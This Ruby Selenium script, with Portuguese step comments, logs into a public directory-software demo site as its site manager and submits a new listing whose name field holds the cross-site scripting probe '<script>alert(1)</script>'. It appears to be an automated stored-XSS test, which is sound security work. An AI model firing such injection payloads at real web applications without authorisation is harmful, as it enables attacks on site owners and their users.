require 'selenium-webdriver'
driver = Selenium::WebDriver.for :firefox
driver.get('https://demodirectory.com.br/')

wait = Selenium::WebDriver::Wait.new(timeout: 10) # Espera pelo redirect 
wait.until { driver.find_element(class: 'nav-item-dropdown') }


driver.find_element(:xpath, "/html/body/div[1]/div[1]/div[2]/div[1]").click
driver.find_element(:xpath, "/html/body/div[1]/div[1]/div[2]/div[2]/a[1]").click



####PASSO 3######
driver.find_element(id: 'username').clear
driver.find_element(id: 'password').clear
driver.find_element(id: 'username').send_keys("sitemgr@demodirectory.com")
driver.find_element(id: 'password').send_keys("abc123")


driver.find_element(xpath: '/html/body/main/div/div[2]/div/div[2]/form/div/button').click


#PASSO 4
driver.find_element(xpath: '//*[@id="tour-content"]').click
wait.until { driver.find_element(class: 'submenu-link') }
sleep 4

driver.find_element(xpath: '/html/body/main/nav/div[2]/div[1]/div[2]/a[1]').click
driver.find_element(xpath: '/html/body/main/div/div[2]/div[2]/a').click
driver.find_element(id: 'listingTemplate').click
driver.find_element(xpath: '/html/body/main/div[2]/div[2]/form/div[1]/div/div/div[2]/select/option[10]').click
driver.find_element(id: 'name').send_keys("<script>alert(1)</script>")
sleep 3
driver.find_element(id: 'browse-categories').click
sleep 3
driver.find_element(xpath: '/html/body/main/div[2]/div[2]/form/section[2]/div[2]/div/div/div[1]/div[2]/div[2]/div[1]/div[2]/div/div/div[2]/div[2]/div[1]/div/a[2]').click
sleep 3
driver.find_element(xpath: '/html/body/main/div[2]/div[2]/form/section[3]/div/div/button').click

